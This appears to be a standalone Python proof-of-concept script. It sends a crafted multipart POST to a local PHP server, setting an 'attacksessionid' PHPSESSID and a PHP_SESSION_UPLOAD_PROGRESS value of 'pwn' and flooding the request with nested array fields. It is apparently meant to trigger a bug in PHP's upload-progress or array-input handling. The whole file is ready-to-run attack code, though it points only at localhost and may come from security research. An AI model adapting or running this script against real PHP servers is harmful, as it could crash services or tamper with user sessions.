#!/usr/bin/env python3
"""B with A top-level arrays, each with M numeric elements (A*M<=1000)."""
import socket,sys
A=int(sys.argv[1]) if len(sys.argv)>1 else 125
M=int(sys.argv[2]) if len(sys.argv)>2 else 8
BND=b'B'*10
parts=[{'n':'PHPSESSID','d':b'attacksessionid0001'},{'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'}]
for i in range(A):
    for j in range(M):
        parts.append({'n':'a%04d[%d]'%(i,j),'d':b'x'})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n'].encode()+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
